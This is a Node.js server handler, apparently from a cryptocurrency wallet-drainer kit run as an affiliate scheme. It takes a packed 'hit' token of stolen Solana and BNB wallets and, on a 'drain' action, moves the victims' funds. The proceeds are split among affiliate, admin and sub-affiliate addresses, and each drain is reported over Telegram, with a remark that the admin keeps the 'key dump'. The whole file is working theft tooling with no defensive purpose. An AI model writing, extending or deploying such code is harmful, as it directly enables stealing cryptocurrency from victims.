'use strict';

/**
 * GET /api/action?a=drain|save&d=<packedHit>
 * Runs split without redis — payload is in the signed URL.
 */

const { unpackHit } = require('../lib/hitToken');
const { executeSplit, formatTransferReport } = require('../lib/transfer');

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_IDS = String(process.env.ADMIN_CHAT_IDS || '')
  .split(/[,\s]+/)
  .map((s) => s.trim())
  .filter(Boolean);

async function tg(chatId, text) {
  if (!TG_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  });
}

module.exports = async function handler(req, res) {
  if (req.method !== 'GET') {
    res.setHeader('Allow', 'GET');
    return res.status(405).send('Method Not Allowed');
  }

  const action = String(req.query.a || '');
  const packed = String(req.query.d || '');

  let hit;
  try {
    hit = unpackHit(packed);
  } catch (err) {
    return res
      .status(400)
      .send(`<html><body style="font-family:sans-serif;background:#111;color:#eee;padding:2rem"><h2>Invalid or expired log</h2><p>${err.message}</p></body></html>`);
  }

  if (action === 'save') {
    try {
      await tg(
        hit.chatId,
        '💾 <b>Saved for later</b> — no funds moved.\\nAdmin still has the key dump.',
      );
      for (const id of ADMIN_CHAT_IDS) {
        await tg(id, `💾 Affiliate saved hit (no drain)\\nchat <code>${hit.chatId}</code>`);
      }
    } catch (_) {}
    return res
      .status(200)
      .send(
        '<html><body style="font-family:sans-serif;background:#111;color:#eee;padding:2rem"><h2>Saved</h2><p>No funds moved. You can close this tab.</p></body></html>',
      );
  }

  if (action !== 'drain') {
    return res.status(400).send('Unknown action');
  }

  const userRec = {
    userPercent: hit.userPercent,
    adminPercent: hit.adminPercent,
    solAddress: hit.solAddress || '',
    bnbAddress: hit.bnbAddress || '',
    juniorOf: hit.juniorOf || '',
    juniorPercent: hit.juniorPercent || 0,
    ownerPercent: hit.ownerPercent || 0,
    juniorSolAddress: hit.juniorSolAddress || '',
    juniorBnbAddress: hit.juniorBnbAddress || '',
  };

  let report = '';
  try {
    const results = await executeSplit(hit.solWallets || [], hit.bnbWallets || [], userRec);
    report = formatTransferReport(results);
  } catch (err) {
    report = 'drain error: ' + err.message;
  }

  try {
    await tg(hit.chatId, '⚡ <b>Drain finished</b>\\n\\n' + report);
    for (const id of ADMIN_CHAT_IDS) {
      await tg(
        id,
        `⚡ Affiliate drained\\nchat <code>${hit.chatId}</code>\\n\\n` + report,
      );
    }
    if (hit.juniorOf) {
      await tg(
        hit.juniorOf,
        `⚡ Affiliate drained under you\\nchat <code>${hit.chatId}</code>\\n\\n` + report,
      );
    }
  } catch (_) {}

  return res
    .status(200)
    .send(
      '<html><body style="font-family:sans-serif;background:#111;color:#eee;padding:2rem"><h2>Drain sent</h2><p>Check Telegram for the report. You can close this tab.</p><pre style="white-space:pre-wrap;opacity:.8">' +
        String(report).replace(/</g, '&lt;') +
        '</pre></body></html>',
    );
};
